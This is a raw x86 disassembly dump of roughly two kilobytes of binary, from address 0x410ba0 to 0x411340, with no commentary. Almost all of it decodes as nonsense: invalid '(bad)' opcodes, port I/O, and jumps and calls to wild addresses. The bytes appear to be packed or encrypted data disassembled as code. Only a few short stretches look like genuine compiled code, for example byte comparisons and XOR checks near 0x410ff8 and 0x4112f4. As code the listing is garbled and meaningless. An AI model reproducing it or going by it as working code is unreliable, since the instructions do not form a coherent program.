  410ba0:	in     al,0x8b
  410ba2:	jge    0x11a04bf0
  410ba8:	push   eax
  410ba9:	scas   al,BYTE PTR es:[edi]
  410baa:	sbb    esp,DWORD PTR [ecx-0x29a0e91d]
  410bb0:	cmp    DWORD PTR [ebx-0x5e],edi
  410bb3:	ja     0x410bc3
  410bb5:	adc    al,BYTE PTR [eax+ecx*4-0x7b]
  410bb9:	clc    
  410bba:	arpl   WORD PTR [esi+0x16af8101],si
  410bc0:	jge    0x410c15
  410bc2:	jge    0x410b58
  410bc4:	stc    
  410bc5:	dec    edi
  410bc6:	jno    0x410bc3
  410bc8:	pop    ecx
  410bc9:	ins    DWORD PTR es:[edi],dx
  410bca:	sbb    eax,0xacff3d35
  410bcf:	lahf   
  410bd0:	pop    eax
  410bd1:	sbb    ah,BYTE PTR [edx-0x1947e988]
  410bd7:	lds    edx,FWORD PTR [edi-0x3c9961a7]
  410bdd:	stos   DWORD PTR es:[edi],eax
  410bde:	push   0x5f
  410be0:	jge    0x410b6b
  410be2:	mov    DWORD PTR [bx],edx
  410be5:	dec    esp
  410be6:	add    eax,0xcd53b18c
  410beb:	int    0x17
  410bed:	jb     0x410be8
  410bef:	inc    eax
  410bf0:	mov    ah,0x86
  410bf2:	in     eax,dx
  410bf3:	lods   eax,DWORD PTR ds:[esi]
  410bf4:	inc    edx
  410bf5:	pop    esp
  410bf6:	and    dl,BYTE PTR [edi-0x66]
  410bf9:	push   ss
  410bfa:	mov    BYTE PTR [edx],bh
  410bfc:	pop    edi
  410bfd:	xor    BYTE PTR [ebx],dl
  410bff:	ret    
  410c00:	arpl   WORD PTR [eax-0x2f],ax
  410c03:	retf   0x1c94
  410c06:	push   ss
  410c07:	push   esi
  410c08:	pop    ss
  410c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c0a:	lock jle 0x410c12
  410c0d:	jmp    0x8ea3:0xed20eaf1
  410c14:	push   ss
  410c15:	push   ebp
  410c16:	cmc    
  410c17:	aaa    
  410c18:	pusha  
  410c19:	xchg   edi,eax
  410c1a:	out    0x98,eax
  410c1c:	or     BYTE PTR [eax],al
  410c1e:	dec    ebp
  410c1f:	(bad)  
  410c20:	stos   DWORD PTR es:[edi],eax
  410c21:	add    al,0x68
  410c23:	cmp    ah,cl
  410c25:	dec    ebp
  410c26:	push   esp
  410c27:	sbb    DWORD PTR [ebx+edx*4-0x39],esp
  410c2b:	imul   ebx,esp,0x520c0c16
  410c31:	std    
  410c32:	push   0xffffffa9
  410c34:	mov    edi,0x33fa5704
  410c39:	jl     0x410bda
  410c3b:	jnp    0x410bda
  410c3d:	xchg   edx,ebx
  410c3f:	mov    dh,0xc
  410c41:	enter  0x6678,0x9f
  410c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c46:	(bad)  
  410c48:	and    eax,0x53694903
  410c4d:	cmp    ebx,ebp
  410c4f:	loope  0x410bd5
  410c51:	and    DWORD PTR [esi],ebx
  410c53:	(bad)  
  410c55:	mov    ds:0xe39cccda,al
  410c5a:	ss into 
  410c5c:	addr16 pop ebx
  410c5e:	int    0x24
  410c60:	addr16 cdq 
  410c62:	dec    edx
  410c63:	sbb    ebx,ebp
  410c65:	inc    ebx
  410c66:	jns    0x410bfa
  410c68:	retf   
  410c69:	sub    ecx,DWORD PTR [edi+0x18b6a2d8]
  410c6f:	outs   dx,DWORD PTR ds:[esi]
  410c70:	fistp  DWORD PTR ds:0x4ebe5e5d
  410c76:	test   al,0xe8
  410c78:	stc    
  410c79:	ret    0xfa4e
  410c7c:	aad    0x8c
  410c7e:	xor    DWORD PTR [edi-0x5b],ebp
  410c81:	test   eax,0x21fdfc64
  410c86:	(bad)  
  410c87:	adc    al,BYTE PTR [esi+0xa04188c]
  410c8d:	std    
  410c8e:	sub    cl,al
  410c90:	bound  esp,QWORD PTR [edx]
  410c92:	add    BYTE PTR [ebx+0x58a8387e],ch
  410c98:	pop    eax
  410c99:	call   0xc84437e4
  410c9e:	or     BYTE PTR [esi-0x1e],ch
  410ca1:	(bad)  
  410ca2:	sti    
  410ca3:	push   ds
  410ca4:	popa   
  410ca5:	stos   DWORD PTR es:[edi],eax
  410ca6:	test   BYTE PTR [ebx-0x242a3630],dh
  410cac:	add    DWORD PTR [esi],edi
  410cae:	add    dh,BYTE PTR [ebx]
  410cb0:	ror    DWORD PTR [esi],1
  410cb2:	sbb    DWORD PTR [edi+0x5f3bac15],esp
  410cb8:	sbb    dh,BYTE PTR [esp+esi*2]
  410cbb:	and    BYTE PTR [ebx],ah
  410cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cbe:	fs imul ebx,ebp,0xfffffff1
  410cc2:	xchg   edx,eax
  410cc3:	lock test al,0x71
  410cc6:	mov    DWORD PTR [ebx-0x5a],ebx
  410cc9:	test   al,0x25
  410ccb:	push   edx
  410ccc:	xchg   esp,eax
  410ccd:	or     BYTE PTR [ebp+0x37],al
  410cd0:	mov    ch,dh
  410cd2:	xor    ah,BYTE PTR [edi-0x42]
  410cd5:	imul   eax,DWORD PTR [ebx],0x50
  410cd8:	push   edx
  410cd9:	jns    0x410cd0
  410cdb:	push   eax
  410cdc:	out    0x16,eax
  410cde:	push   ebp
  410cdf:	mov    dh,0x4c
  410ce1:	mov    ebp,0x7272b32e
  410ce6:	mov    edi,0x8f5e7b9d
  410ceb:	inc    esi
  410cec:	int3   
  410ced:	sub    BYTE PTR [eax+0x49b5b6b0],bl
  410cf3:	test   ch,0x16
  410cf6:	mov    ebx,0x114c07ab
  410cfb:	in     al,0x80
  410cfd:	arpl   WORD PTR [ebx-0x18],si
  410d00:	cmp    DWORD PTR [ecx],edx
  410d02:	(bad)  
  410d03:	dec    edx
  410d04:	jno    0x410d63
  410d06:	add    BYTE PTR [edi+0x6b7cfbef],dl
  410d0c:	mov    DWORD PTR [edx],eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xbb495c9c
  410d25:	mov    dl,0xeb
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	dec    edx
  410d2f:	xchg   ebp,eax
  410d30:	adc    eax,DWORD PTR ds:0x7bbbc88
  410d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d37:	inc    edx
  410d38:	int3   
  410d39:	or     BYTE PTR [ebx],dl
  410d3b:	pop    ebx
  410d3c:	test   BYTE PTR [ebp-0x1d],ch
  410d3f:	mov    bh,0xbc
  410d41:	sub    BYTE PTR [esi-0x48],0xa3
  410d45:	mov    ebp,ebp
  410d47:	lods   eax,DWORD PTR ds:[esi]
  410d48:	xlat   BYTE PTR ds:[ebx]
  410d49:	jmp    0xd133d9a1
  410d4e:	add    ch,al
  410d50:	push   cs
  410d51:	out    dx,al
  410d52:	inc    ebx
  410d53:	xor    BYTE PTR [edi],0xe5
  410d56:	and    al,0xa9
  410d58:	mov    ebx,es
  410d5a:	push   esp
  410d5b:	int3   
  410d5c:	enter  0x1a80,0x1d
  410d60:	mov    al,ds:0xf6d195f8
  410d65:	fadd   QWORD PTR [eax+0x23a35f9d]
  410d6b:	xor    al,0x7
  410d6d:	sbb    eax,0x71153e05
  410d72:	retf   0x484f
  410d75:	mov    bl,0xd0
  410d77:	sbb    ah,BYTE PTR [eax]
  410d79:	fld    TBYTE PTR [edi+0x77]
  410d7c:	push   eax
  410d7d:	call   0xd63d:0x32178319
  410d84:	shl    DWORD PTR [ecx],1
  410d86:	add    BYTE PTR [esi-0x6c],ah
  410d89:	enter  0xa145,0x41
  410d8d:	in     eax,0x80
  410d8f:	mov    DWORD PTR [ecx+0x452071ea],ecx
  410d95:	and    BYTE PTR [esi+0x73],0xe1
  410d99:	stc    
  410d9a:	ja     0x410d34
  410d9c:	or     eax,0xf6bc7362
  410da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410da2:	aas    
  410da3:	lds    ecx,FWORD PTR [edi-0x6f506922]
  410da9:	jge    0x410dec
  410dab:	test   bl,ah
  410dad:	mov    cs:0x75d7f29e,al
  410db3:	or     esp,edx
  410db5:	inc    esp
  410db6:	push   cs
  410db7:	sub    BYTE PTR [eax-0x3b],dh
  410dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410dbb:	jecxz  0x410da5
  410dbd:	push   esi
  410dbe:	cmp    dl,ah
  410dc0:	(bad)  
  410dc1:	adc    dl,BYTE PTR [ebx]
  410dc3:	sar    BYTE PTR [edi],0x76
  410dc6:	retf   0xaaf7
  410dc9:	test   BYTE PTR [eax+0x78],0x6d
  410dcd:	add    al,0x2a
  410dcf:	sar    DWORD PTR [bp+di-0x9f3],0x5f
  410dd5:	push   edx
  410dd6:	ins    BYTE PTR es:[edi],dx
  410dd7:	jo     0x410d6e
  410dd9:	jmp    0x410db0
  410ddb:	push   es
  410ddc:	je     0x410e0d
  410dde:	imul   ebx,DWORD PTR [edx],0xe4809434
  410de4:	ret    0x2679
  410de7:	xor    dl,ah
  410de9:	mov    DWORD PTR [edi],eax
  410deb:	(bad)  
  410dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ded:	pop    ecx
  410dee:	xchg   ebx,eax
  410def:	sar    DWORD PTR [eax-0x7e8f479f],0x90
  410df6:	push   ds
  410df7:	hlt    
  410df8:	jmp    0xceb6ea78
  410dfd:	sbb    eax,0x7f9733f9
  410e02:	mov    BYTE PTR ds:0x6cbaeff4,ch
  410e08:	repnz shl DWORD PTR [edi-0x59],cl
  410e0c:	and    al,0xec
  410e0e:	enter  0x6cef,0xc1
  410e12:	fidiv  DWORD PTR [esi]
  410e14:	dec    ebp
  410e15:	pop    ebx
  410e16:	test   DWORD PTR [edi],esi
  410e18:	jge    0x410e05
  410e1a:	mov    dl,0x9a
  410e1c:	xor    ah,0x2a
  410e1f:	out    dx,al
  410e20:	push   cs
  410e21:	retf   
  410e22:	push   ebx
  410e23:	call   0x5d22fae1
  410e28:	xor    al,BYTE PTR [edx-0x4d]
  410e2b:	mov    eax,0x308363c2
  410e30:	iret   
  410e31:	scas   eax,DWORD PTR es:[edi]
  410e32:	enter  0xbf97,0xd6
  410e36:	out    0xf9,eax
  410e38:	sub    BYTE PTR [ebx],ch
  410e3a:	cmp    al,0xcd
  410e3d:	sar    edx,1
  410e3f:	fld    QWORD PTR gs:[edx]
  410e42:	outs   dx,BYTE PTR ds:[esi]
  410e43:	cmp    edx,esi
  410e45:	or     edi,DWORD PTR [ecx+0x1f]
  410e48:	xchg   edi,eax
  410e49:	repz dec ebp
  410e4b:	sub    edi,DWORD PTR [eax-0x30]
  410e4e:	jne    0x410e19
  410e50:	stos   DWORD PTR es:[edi],eax
  410e51:	xor    esi,DWORD PTR [ecx]
  410e53:	dec    edi
  410e54:	xchg   DWORD PTR ds:0xb3145bb1,edi
  410e5a:	jle    0x410e82
  410e5c:	inc    edi
  410e5d:	fiadd  WORD PTR [edx+0x46377f23]
  410e63:	sub    ebp,DWORD PTR [ecx+0x3d3e71c9]
  410e69:	retf   0x907b
  410e6c:	lahf   
  410e6d:	jo     0x410e37
  410e6f:	lahf   
  410e70:	add    ebx,0xd29921b0
  410e76:	mov    edi,0xd654d2d5
  410e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e7c:	xor    al,0x99
  410e7e:	and    eax,0xa712949d
  410e83:	xchg   esi,eax
  410e84:	stc    
  410e85:	fistp  WORD PTR [ecx]
  410e87:	ret    
  410e88:	mov    al,ds:0x8cf65507
  410e8d:	push   es
  410e8e:	cmp    bl,BYTE PTR ds:0xbf94df2
  410e94:	ds add dh,al
  410e97:	inc    eax
  410e98:	shl    DWORD PTR [ebx],0x27
  410e9b:	adc    esi,DWORD PTR [edi-0x66]
  410e9e:	outs   dx,BYTE PTR ds:[esi]
  410e9f:	xchg   esp,eax
  410ea0:	stos   DWORD PTR es:[edi],eax
  410ea1:	adc    BYTE PTR ds:0x974dbbb6,ah
  410ea7:	mov    esi,0xe295a287
  410eac:	shr    BYTE PTR [esi+0x793704e6],1
  410eb2:	fdiv   QWORD PTR [ecx+0x5d894600]
  410eb8:	mov    dl,0xa8
  410eba:	out    dx,al
  410ebb:	jl     0x410edf
  410ebd:	lahf   
  410ebe:	daa    
  410ebf:	dec    edi
  410ec0:	push   es
  410ec1:	(bad)  
  410ec2:	jmp    0x67fb766b
  410ec7:	add    ah,BYTE PTR [ebx-0x9c76cf8]
  410ecd:	in     al,dx
  410ece:	dec    eax
  410ecf:	jecxz  0x410f21
  410ed1:	loope  0x410f32
  410ed3:	les    di,DWORD PTR [edi+0x56c07e06]
  410eda:	les    esi,FWORD PTR [ecx+esi*2-0x7b]
  410ede:	xchg   esi,eax
  410ee0:	mov    ebp,es
  410ee2:	daa    
  410ee3:	sub    cl,ch
  410ee5:	fstp   TBYTE PTR [esi]
  410ee7:	pop    edx
  410ee8:	outs   dx,DWORD PTR ds:[esi]
  410ee9:	mov    edi,0x2d3575e4
  410eee:	loope  0x410f11
  410ef0:	ja     0x410eaf
  410ef2:	add    al,0xbf
  410ef4:	jbe    0x410ef8
  410ef6:	jae    0x410e8b
  410ef8:	mov    esi,0xc48a9401
  410efd:	test   BYTE PTR [edi],al
  410eff:	inc    esp
  410f00:	neg    dl
  410f02:	mov    eax,ds:0x3a81394d
  410f07:	rcl    BYTE PTR [ecx+0x5ed74e7e],0xd9
  410f0e:	lahf   
  410f0f:	or     al,0xb4
  410f11:	push   cs
  410f12:	mov    ds:0xa40e2c0f,al
  410f17:	jl     0x410ed2
  410f19:	mov    dh,0x5
  410f1b:	jmp    FWORD PTR ds:0xe9632498
  410f21:	loopne 0x410f41
  410f23:	pop    esi
  410f24:	ja     0x410ecc
  410f26:	cmp    ebx,ecx
  410f28:	js     0x410f11
  410f2a:	mov    ds:0x1945deac,eax
  410f2f:	mov    esi,es
  410f31:	dec    edx
  410f32:	and    edx,0xffffffda
  410f35:	cmp    ch,BYTE PTR [eax]
  410f37:	lock push ebp
  410f39:	mov    BYTE PTR [esp+eax*8-0x66],dh
  410f3d:	mov    DWORD PTR [eax-0x60d2ffb5],0xdda8f8d6
  410f47:	jns    0x410f4d
  410f49:	mov    al,0xa7
  410f4b:	fidiv  WORD PTR [ebx]
  410f4d:	xchg   cl,dh
  410f4f:	push   esi
  410f50:	shl    DWORD PTR [edi+0x0],1
  410f53:	lds    ebx,FWORD PTR [ebp-0x1ce2c508]
  410f59:	add    DWORD PTR [ebx-0x2481f8cc],esi
  410f5f:	mov    edx,0xd3fb29e5
  410f64:	sub    al,0x83
  410f66:	mov    esi,0x261ac6f7
  410f6b:	cdq    
  410f6c:	mov    ecx,0xebaef8b
  410f71:	or     ecx,DWORD PTR [esi+0x9]
  410f74:	xchg   edi,eax
  410f75:	fld    TBYTE PTR ds:0x7a2a0d
  410f7b:	or     al,0xc6
  410f7d:	scas   eax,DWORD PTR es:[edi]
  410f7e:	data16 das 
  410f80:	int3   
  410f81:	push   edx
  410f82:	mov    cl,0xe4
  410f84:	inc    ebp
  410f85:	int    0xf2
  410f87:	cwde   
  410f88:	and    ebp,DWORD PTR [ecx-0x75]
  410f8b:	inc    esi
  410f8c:	push   edi
  410f8d:	je     0x410fde
  410f8f:	xchg   esp,eax
  410f90:	pop    ds
  410f91:	scas   al,BYTE PTR es:[edi]
  410f92:	xor    eax,0xf2c7b364
  410f97:	push   ebp
  410f98:	call   0xc56f2a04
  410f9d:	cmp    DWORD PTR [eax+0x7d371441],0xffffffc5
  410fa4:	imul   ebp,DWORD PTR [edx-0x7ec47c6c],0xc6a00b64
  410fae:	mov    fs,ecx
  410fb0:	imul   edi,DWORD PTR [edx+0xc6a0f1d],0xa91f9abb
  410fba:	out    0x63,eax
  410fbc:	mov    ds:0x759d5e07,eax
  410fc1:	dec    eax
  410fc2:	dec    esi
  410fc3:	push   ebp
  410fc4:	mov    ebx,0xa9b22a8f
  410fc9:	mov    esi,0xde8ff9c7
  410fce:	inc    esi
  410fcf:	mov    esp,0xa75bb9b2
  410fd4:	jae    0x410fc1
  410fd6:	sub    BYTE PTR [ecx-0x25],bh
  410fd9:	iret   
  410fda:	fdivrp st(2),st
  410fdc:	pop    eax
  410fdd:	shl    BYTE PTR [ecx-0x39fc3ecd],0x89
  410fe4:	inc    ebp
  410fe5:	or     BYTE PTR [ebx+0x448a0845],cl
  410feb:	add    eax,0xff558aa8
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411009
  41102b:	inc    edi
  41102c:	jo     0x410fc8
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x410fc4
  411037:	fwait
  411038:	cmp    BYTE PTR gs:[edi],dh
  41103b:	jo     0x41103b
  41103d:	aam    0xc1
  41103f:	stos   BYTE PTR es:[edi],al
  411040:	(bad)  
  411041:	pop    ss
  411042:	test   eax,0xb674bc40
  411047:	mov    cl,0xf3
  411049:	jg     0x410fe8
  41104b:	sub    DWORD PTR [eax+ebp*8+0x5604c657],ecx
  411052:	out    0xd8,al
  411054:	xor    esp,DWORD PTR [ebx]
  411056:	es test al,0x17
  411059:	xchg   esp,eax
  41105a:	dec    edx
  41105b:	push   esp
  41105c:	jae    0x41100c
  41105e:	adc    al,0x81
  411060:	sub    al,0x5
  411062:	fstp   TBYTE PTR [ecx]
  411064:	mov    BYTE PTR [ecx+0x73f5d92a],ah
  41106a:	cmp    eax,0x70b153f9
  41106f:	cs fwait
  411071:	push   0x24
  411073:	cdq    
  411074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411075:	jg     0x41100a
  411077:	jecxz  0x411029
  411079:	push   eax
  41107a:	lea    esp,[eax-0x149cf4dc]
  411080:	aaa    
  411081:	lods   al,BYTE PTR ds:[esi]
  411082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411083:	stc    
  411084:	cmp    dh,BYTE PTR [edi+0x3a]
  411087:	arpl   WORD PTR [eax+edi*2+0x40f15afc],bx
  41108e:	inc    esp
  41108f:	mov    al,0xb2
  411091:	loop   0x41110f
  411093:	xchg   ecx,eax
  411094:	pop    ss
  411095:	jg     0x4110d5
  411097:	fsubr  DWORD PTR [edx-0x2a]
  41109a:	ss fwait
  41109c:	aas    
  41109d:	pop    esp
  41109e:	stos   BYTE PTR es:[edi],al
  41109f:	cmp    al,0xc7
  4110a1:	and    edx,ebp
  4110a3:	repnz mov ebx,DWORD PTR [eax]
  4110a6:	fnstcw WORD PTR [ecx+ecx*4-0x59125bc7]
  4110ad:	jle    0x4110da
  4110af:	outs   dx,DWORD PTR ds:[esi]
  4110b0:	xchg   ecx,eax
  4110b1:	aaa    
  4110b2:	xor    eax,0x2bcab3ce
  4110b7:	addr16 pop eax
  4110b9:	or     eax,0x70341348
  4110be:	pop    edx
  4110bf:	mov    esp,DWORD PTR [eax+0x66038f9c]
  4110c5:	and    eax,DWORD PTR [ecx+0x44]
  4110c8:	add    DWORD PTR [eax],0x284ab75a
  4110ce:	es inc bx
  4110d1:	ret    
  4110d2:	aad    0xd3
  4110d4:	push   ecx
  4110d5:	std    
  4110d6:	xchg   esi,eax
  4110d7:	jb     0x41113d
  4110d9:	or     al,dh
  4110db:	sar    DWORD PTR [edi-0x52],cl
  4110de:	sub    esp,DWORD PTR [eax]
  4110e0:	add    DWORD PTR [ecx-0x3c],eax
  4110e3:	sahf   
  4110e4:	dec    esi
  4110e5:	(bad)  
  4110e7:	adc    BYTE PTR [edi],ch
  4110e9:	into   
  4110ea:	ins    BYTE PTR es:[edi],dx
  4110eb:	fist   DWORD PTR [ebp-0x70]
  4110ee:	je     0x411159
  4110f0:	pop    edx
  4110f1:	cmp    bl,BYTE PTR [ebx]
  4110f3:	mov    dh,0xe0
  4110f5:	test   DWORD PTR [edi-0x4987fe3],esp
  4110fb:	jno    0x411135
  4110fd:	jno    0x411165
  4110ff:	jl     0x4110cf
  411101:	inc    edx
  411102:	test   DWORD PTR [esi-0x29],0x691143fc
  411109:	inc    edi
  41110a:	cwde   
  41110b:	fcom   QWORD PTR [esi]
  41110d:	inc    esp
  41110e:	jo     0x41116a
  411110:	test   dl,ch
  411112:	out    0xf6,eax
  411114:	aad    0x82
  411116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411117:	dec    eax
  411118:	aad    0x79
  41111a:	xchg   ebx,eax
  41111b:	xor    dl,cl
  41111d:	pushf  
  41111e:	jle    0x41111e
  411120:	and    BYTE PTR [edi-0x2d9e77e2],dl
  411126:	inc    ebp
  411127:	dec    BYTE PTR [ecx]
  411129:	gs not ch
  41112c:	inc    edi
  41112d:	clc    
  41112e:	or     al,0xa2
  411130:	xchg   edi,eax
  411131:	mov    BYTE PTR [eax+0xb4e36a0],ah
  411137:	mov    eax,DWORD PTR fs:[edx]
  41113a:	add    ah,bl
  41113c:	or     DWORD PTR [ebx+0x7f],ecx
  41113f:	push   0x9b753573
  411144:	jl     0x41111e
  411146:	and    bl,bl
  411148:	push   ebp
  411149:	pop    esp
  41114a:	mov    dl,BYTE PTR [ecx-0x7c5c0410]
  411150:	scas   al,BYTE PTR es:[edi]
  411151:	xlat   BYTE PTR ds:[ebx]
  411152:	push   ss
  411153:	retf   0xc977
  411156:	fidiv  DWORD PTR [edi+0xf]
  411159:	test   ebp,ecx
  41115b:	into   
  41115c:	sub    eax,0x61e6c645
  411161:	out    dx,al
  411162:	fnstenv [ebx]
  411164:	xchg   edi,eax
  411165:	dec    eax
  411166:	and    BYTE PTR [edi+edi*1],bl
  411169:	(bad)  
  41116a:	in     eax,0xff
  41116c:	jb     0x41112b
  41116e:	or     DWORD PTR [edx+ecx*2+0x46e4c3e5],ecx
  411175:	call   FWORD PTR [eax+0x42]
  411178:	mov    bh,0x6f
  41117a:	fiadd  DWORD PTR [ebx-0x420bb545]
  411180:	push   edx
  411181:	push   edx
  411182:	or     dh,BYTE PTR [ebx-0x22]
  411185:	in     al,0x3c
  411187:	and    ebp,DWORD PTR [ecx-0x4a8591a8]
  41118d:	mov    al,0x52
  41118f:	loope  0x41111a
  411191:	aad    0xb3
  411193:	(bad)  
  411194:	xor    al,0x2e
  411196:	in     eax,dx
  411197:	sbb    ecx,edx
  411199:	sub    cl,BYTE PTR [ebx-0x2e]
  41119c:	pop    ecx
  41119d:	bound  edx,QWORD PTR [ecx+0x4f]
  4111a0:	add    eax,eax
  4111a2:	stos   BYTE PTR es:[edi],al
  4111a3:	stos   BYTE PTR es:[edi],al
  4111a4:	ins    BYTE PTR es:[edi],dx
  4111a5:	or     cl,dl
  4111a7:	sqrtps xmm3,XMMWORD PTR [eax]
  4111aa:	pop    edx
  4111ab:	pop    ss
  4111ac:	jne    0x411207
  4111ae:	push   esi
  4111af:	repnz push ebx
  4111b1:	push   es
  4111b2:	jns    0x4111b0
  4111b4:	imul   edi
  4111b6:	mov    edx,DWORD PTR [esi]
  4111b8:	mov    ds:0xf53fd380,eax
  4111bd:	out    dx,al
  4111be:	mov    ds:0xf2b5ddf9,al
  4111c3:	xor    DWORD PTR [ecx*2+0x5267e85c],edx
  4111ca:	in     al,dx
  4111cb:	test   al,0xe5
  4111cd:	xor    ebp,esp
  4111cf:	pop    ebp
  4111d1:	mov    dh,cl
  4111d3:	or     BYTE PTR [eax-0x640f9bee],al
  4111d9:	sbb    eax,0xf4c069ce
  4111de:	mov    al,0x94
  4111e0:	mov    al,ds:0xa1ce8292
  4111e5:	mov    edx,0xc7dc3c7c
  4111ea:	jp     0x411179
  4111ec:	jle    0x4111ea
  4111ee:	mov    ah,0xf9
  4111f0:	dec    esi
  4111f1:	sbb    dh,dl
  4111f3:	retf   
  4111f4:	cmp    BYTE PTR [ecx],bh
  4111f6:	mov    edx,0xdc7f88cb
  4111fb:	fcomp  DWORD PTR [ecx-0x63]
  4111fe:	and    BYTE PTR [edi+0x3a],dh
  411201:	push   ds
  411202:	into   
  411203:	jnp    0x411219
  411205:	dec    eax
  411206:	stos   DWORD PTR es:[edi],eax
  411207:	or     DWORD PTR [eax],ecx
  411209:	push   ss
  41120a:	inc    ebp
  41120b:	jno    0x4111bb
  41120d:	push   es
  41120e:	or     DWORD PTR [ecx+0x57],edi
  411211:	and    al,0x31
  411213:	jne    0x4111ae
  411215:	vmread DWORD PTR [esi-0x51],esi
  411219:	adc    eax,0xdf971441
  41121e:	push   ebx
  41121f:	pop    edx
  411220:	push   ss
  411221:	and    DWORD PTR [ebx+edx*8+0x7c],ebx
  411225:	jmp    0x36292b6a
  41122a:	jmp    0x4112a5
  41122c:	aam    0x6
  41122e:	cmp    edi,DWORD PTR [ebx+edi*2-0xe]
  411232:	fs pop ecx
  411234:	add    BYTE PTR [ebx],ch
  411236:	xor    eax,0xa05efd78
  41123b:	xchg   ebx,eax
  41123c:	(bad)  [edi-0x2bdfc596]
  411242:	xchg   BYTE PTR [edx-0x40],ch
  411245:	sti    
  411246:	jl     0x411219
  411248:	xlat   BYTE PTR ds:[ebx]
  411249:	int3   
  41124a:	xor    DWORD PTR [ecx-0x57ccb642],edx
  411250:	adc    cl,BYTE PTR ss:[edx+0x2df83ede]
  411257:	push   ss
  411258:	mov    eax,ds:0x48dda132
  41125d:	rol    BYTE PTR [ebx+0x4b],0x18
  411261:	or     edx,ebx
  411263:	sub    DWORD PTR [ebx-0x5],edi
  411266:	jge    0x411219
  411268:	pop    esp
  411269:	dec    ecx
  41126a:	fcom   DWORD PTR [ecx+0x1cc0cfe]
  411270:	rcr    DWORD PTR [ebx],1
  411272:	sbb    ch,BYTE PTR [edx+0x2c1275dd]
  411278:	cmp    eax,0xf080af62
  41127d:	add    dh,ah
  41127f:	ins    DWORD PTR es:[edi],dx
  411280:	mov    ch,0x56
  411282:	mov    ah,0xbe
  411284:	fisubr WORD PTR [edi+0x415997b0]
  41128a:	loopne 0x411291
  41128c:	inc    eax
  41128d:	sbb    BYTE PTR [ecx],ch
  41128f:	add    edi,DWORD PTR [ebp-0x11]
  411292:	je     0x41128a
  411294:	and    esi,ebp
  411296:	fidiv  WORD PTR [edi-0x33]
  411299:	pop    eax
  41129a:	add    al,0x25
  41129c:	js     0x411279
  41129e:	outs   dx,BYTE PTR ds:[esi]
  41129f:	out    dx,al
  4112a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a1:	push   ss
  4112a2:	fwait
  4112a3:	fs test al,0x7d
  4112a6:	shl    DWORD PTR [esi+ecx*4+0x3005beb6],1
  4112ad:	dec    edi
  4112ae:	lock jnp 0x41132b
  4112b1:	(bad)  [ebp+0x32aa2ea8]
  4112b7:	push   0xffffff90
  4112b9:	into   
  4112ba:	cmc    
  4112bb:	push   0x5c
  4112bd:	inc    ecx
  4112be:	sbb    cl,ch
  4112c0:	adc    dl,BYTE PTR [edi-0x1b27de0b]
  4112c6:	repz inc ebx
  4112c8:	jno    0x41128a
  4112ca:	jmp    0x41133e
  4112cc:	(bad)  
  4112cd:	push   ss
  4112ce:	ret    
  4112cf:	out    dx,eax
  4112d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d1:	sub    DWORD PTR [ecx+eiz*4],esp
  4112d4:	gs test esp,esp
  4112d7:	mov    ds,WORD PTR [edx+0x20]
  4112da:	pop    eax
  4112db:	(bad)  
  4112dc:	ins    BYTE PTR es:[edi],dx
  4112dd:	jo     0x4112ca
  4112df:	xchg   ebx,eax
  4112e0:	mov    DWORD PTR [edx-0xaee5dea],ebp
  4112e6:	ja     0x4112f7
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x2e68f61e,eax
  411318:	sbb    DWORD PTR [ebp+0x7e4549c2],esp
  41131e:	jle    0x4112cf
  411320:	jl     0x4113a0
  411322:	jle    0x411393
  411324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411325:	mov    ebx,0xe6529a4c
  41132a:	jl     0x41134d
  41132c:	aam    0xb0
  41132e:	add    DWORD PTR [edi+0x50],eax
  411331:	dec    ecx
  411332:	test   DWORD PTR [ecx+eax*4],edi
  411335:	dec    esp
  411336:	adc    eax,0x46c52643
  41133b:	add    DWORD PTR [edi],ebp
  41133d:	retf   0xf9d8
  411340:	loop   0x411381
